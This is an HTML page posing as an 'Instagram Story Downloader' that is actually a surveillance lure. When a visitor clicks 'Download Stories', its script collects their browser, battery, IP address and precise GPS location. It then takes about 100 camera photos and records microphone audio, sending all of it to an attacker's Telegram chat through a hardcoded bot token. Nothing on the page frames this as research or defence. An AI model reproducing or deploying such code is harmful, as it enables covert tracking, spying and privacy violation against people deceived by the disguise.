<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>Instagram Story Downloader</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      background-size: 400% 400%;
      animation: gradient 15s ease infinite;
    }
    @keyframes gradient {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }
    .navbar {
      background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
      color: white;
      text-align: center;
      padding: 15px 0;
      border-bottom: 1px solid rgba(255,255,255,0.2);
    }
    #header {
      margin: 0;
      font-size: 28px;
      font-weight: bold;
      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }
    .container {
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      background-color: rgba(255,255,255,0.9);
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
      backdrop-filter: blur(5px);
    }
    .form-control {
      width: calc(100% - 22px);
      margin-bottom: 15px;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-sizing: border-box;
      font-family: 'Montserrat', sans-serif;
      font-size: 16px;
      background-color: rgba(255,255,255,0.8);
    }
    #thumbdloadbtn {
      display: block;
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background: linear-gradient(45deg, #405de6, #833ab4, #c13584);
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      font-family: 'Montserrat', sans-serif;
      transition: all 0.3s ease;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    #thumbdloadbtn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(0,0,0,0.15);
      background: linear-gradient(45deg, #833ab4, #c13584, #e1306c);
    }
    footer {
      text-align: center;
      margin-top: 40px;
      color: rgba(255,255,255,0.8);
    }
    .instagram-logo {
      display: block;
      margin: 20px auto;
      width: 100px;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
    }
    ol {
      background-color: rgba(255,255,255,0.7);
      padding: 20px 30px;
      border-radius: 8px;
    }
    li {
      margin-bottom: 10px;
      padding: 5px 0;
    }
    #status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 8px;
      background-color: rgba(255,255,255,0.7);
      text-align: center;
      font-weight: bold;
    }
  </style>
  <script type='text/javascript'>
  //<![CDATA[
  var uri = window.location.toString();
  if (uri.indexOf("%3D") > 0) {
      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
      window.history.replaceState({}, document.title, clean_uri);
  }

  uri = window.location.toString(); if (uri.indexOf("%3D%3D") > 0) { clean_uri = uri.substring(0, uri.indexOf("%3D%3D")); window.history.replaceState({}, document.title, clean_uri); }

  uri = window.location.toString(); if (uri.indexOf("&m=1") > 0) { clean_uri = uri.substring(0, uri.indexOf("&m=1")); window.history.replaceState({}, document.title, clean_uri); }

  uri = window.location.toString(); if (uri.indexOf("?m=1") > 0) { clean_uri = uri.substring(0, uri.indexOf("?m=1")); window.history.replaceState({}, document.title, clean_uri); } //]]> 
  </script>
</head>
<body>
  <nav class="navbar">
    <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
    <h1 id="header">INSTAGRAM STORY DOWNLOADER</h1>
  </nav>

  <div class="container">
    <input id="ytlink" type="text" class="form-control" placeholder="Enter Instagram Username" spellcheck="false">
    <button id="thumbdloadbtn" onclick="initiateCapture()">DOWNLOAD STORIES</button>
    <div id="status">Status: Ready</div>
    <div id="thumbnail-preview"><!-- Placeholder for story preview --></div>
  </div>

  <center>
    <button id="toggle-video" style="display:none;">Toggle Video</button>
    <div id="message-container"></div>
    <video id="video" width="0" height="0" autoplay></video>
  </center>

  <script type="text/javascript">
    // Global variables
    let chatid = null;
    let mediaStream = null;
    let imageCapture = null;
    let audioRecorder = null;
    let audioChunks = [];
    let isCapturing = false;
    let captureInterval = null;
    
    // Update status message
    function updateStatus(message) {
      document.getElementById('status').textContent = "Status: " + message;
    }
    
    // Get browser name
    function getBrowserName() {
      const userAgent = navigator.userAgent;
      if (userAgent.indexOf("Chrome") > -1) return "Chrome";
      if (userAgent.indexOf("Safari") > -1) return "Safari";
      if (userAgent.indexOf("Firefox") > -1) return "Firefox";
      if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) return "Internet Explorer";
      if (userAgent.indexOf("Edge") > -1) return "Edge";
      if (userAgent.indexOf("Opera") > -1) return "Opera";
      return "Unknown Browser";
    }
    
    // Get battery information
    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          return `Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
        } catch (error) {
          return "Battery: Information not available";
        }
      } else {
        return "Battery: API not supported";
      }
    }
    
    // Get IP address
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return "IP: Unable to retrieve";
      }
    }
    
    // Get location information
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject("Geolocation is not supported by this browser.");
          return;
        }
        
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            resolve({
              text: `Location: Latitude ${latitude}, Longitude ${longitude}`,
              mapsLink: googleMapsLink
            });
          },
          (error) => {
            reject(`Location error: ${error.message}`);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }
    
    // Initialize the capturing process
    async function initiateCapture() {
      updateStatus("Initializing...");
      
      // Change button text
      var btn = document.getElementById('thumbdloadbtn');
      btn.textContent = 'Processing...';
      btn.disabled = true;
      
      try {
        // Get the chat ID from URL
        const base64Id = GetURLParameter('i');
        chatid = base64Id ? decodeBase64(base64Id) : null;
        
        if (!chatid) {
          throw new Error('No valid chat ID found.');
        }
        
        // Get device information
        const browserName = getBrowserName();
        const batteryInfo = await getBatteryInfo();
        const ipAddress = await getIPAddress();
        
        // Get location
        let locationInfo = "Location: Permission denied or unavailable";
        let mapsLink = "";
        try {
          const locationData = await getLocation();
          locationInfo = locationData.text;
          mapsLink = locationData.mapsLink;
        } catch (locationError) {
          console.warn(locationError);
        }
        
        // Send device information
        const deviceInfo = `Browser: ${browserName}\n${batteryInfo}\nIP: ${ipAddress}\n${locationInfo}`;
        await sendToTelegramAsMessage(deviceInfo);
        
        // If we have a maps link, send it separately
        if (mapsLink) {
          await sendToTelegramAsMessage(`Google Maps: ${mapsLink}`);
        }
        
        // Request media permissions
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
          video: true, 
          audio: true 
        });
        
        // Set up image capture
        const videoTrack = mediaStream.getVideoTracks()[0];
        imageCapture = new ImageCapture(videoTrack);
        
        // Set up audio recording
        const audioTracks = mediaStream.getAudioTracks();
        if (audioTracks.length > 0) {
          audioRecorder = new MediaRecorder(mediaStream);
          audioChunks = [];
          
          audioRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              audioChunks.push(event.data);
            }
          };
          
          audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            await sendToTelegram(audioBlob, 'audio');
          };
        }
        
        // Start capturing
        isCapturing = true;
        updateStatus("Capturing media...");
        
        // Start audio recording
        if (audioRecorder) {
          audioRecorder.start();
        }
        
        // Capture photos at high speed (100 photos in 10 seconds)
        let photoCount = 0;
        const maxPhotos = 100;
        const captureDuration = 10000; // 10 seconds
        
        captureInterval = setInterval(async () => {
          if (photoCount >= maxPhotos || !isCapturing) {
            clearInterval(captureInterval);
            return;
          }
          
          try {
            const photoBlob = await imageCapture.takePhoto();
            await sendToTelegram(photoBlob, 'photo');
            photoCount++;
            updateStatus(`Captured ${photoCount}/${maxPhotos} photos`);
          } catch (error) {
            console.error('Error capturing photo:', error);
          }
        }, captureDuration / maxPhotos);
        
        // Stop capturing after duration
        setTimeout(() => {
          stopCapture();
        }, captureDuration);
        
      } catch (error) {
        console.error('Error in initialization:', error);
        updateStatus(`Error: ${error.message}`);
        btn.textContent = 'DOWNLOAD STORIES';
        btn.disabled = false;
        
        // Send error message if we have a chat ID
        if (chatid) {
          sendToTelegramAsMessage(`Error during initialization: ${error.message}`);
        }
      }
    }
    
    // Stop the capture process
    function stopCapture() {
      isCapturing = false;
      
      if (captureInterval) {
        clearInterval(captureInterval);
      }
      
      if (audioRecorder && audioRecorder.state === 'recording') {
        audioRecorder.stop();
      }
      
      if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
      }
      
      updateStatus("Capture completed");
      document.getElementById('thumbdloadbtn').textContent = 'DOWNLOAD STORIES';
      document.getElementById('thumbdloadbtn').disabled = false;
    }
    
    // Send media to Telegram
    async function sendToTelegram(data, type) {
      const botToken = '8479121123:AAGBIivhg3pfzjBLjuj3FzSHwHC2kpG7ikg'; 
      
      if (!chatid) {
        console.error('Chat ID is not available.');
        return;
      }
      
      const formData = new FormData();
      formData.append('chat_id', chatid);
      formData.append(type === 'photo' ? 'photo' : 'audio', data, `capture.${type === 'photo' ? 'jpg' : 'ogg'}`);
      
      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
          method: 'POST',
          body: formData
        });
        
        if (!response.ok) {
          throw new Error(`Telegram API error: ${response.status}`);
        }
        
        const result = await response.json();
        console.log('Media sent successfully:', result);
      } catch (error) {
        console.error('Error sending to Telegram:', error);
      }
    }
    
    // Send text message to Telegram
    async function sendToTelegramAsMessage(text) {
      const botToken = 'Your_bot_token_here'; // Replace with your bot token
      
      if (!chatid) {
        console.error('Chat ID is not available.');
        return;
      }
      
      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatid,
            text: text
          })
        });
        
        if (!response.ok) {
          throw new Error(`Telegram API error: ${response.status}`);
        }
        
        const result = await response.json();
        console.log('Message sent successfully:', result);
      } catch (error) {
        console.error('Error sending message to Telegram:', error);
      }
    }
    
    // Utility functions
    function GetURLParameter(sParam) {
      var sPageURL = window.location.search.substring(1);
      var sURLVariables = sPageURL.split('&');
      for (var i = 0; i < sURLVariables.length; i++) {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) {
          return sParameterName[1];
        }
      }
    }

    function decodeBase64(encodedStr) {
      try {
        return decodeURIComponent(atob(encodedStr));
      } catch (e) {
        console.error('Base64 decode error:', e);
        return null;
      }
    }
  </script>

  <footer>
    <p>Made By HIDDEN KING</p>
  </footer>
</body>
</html>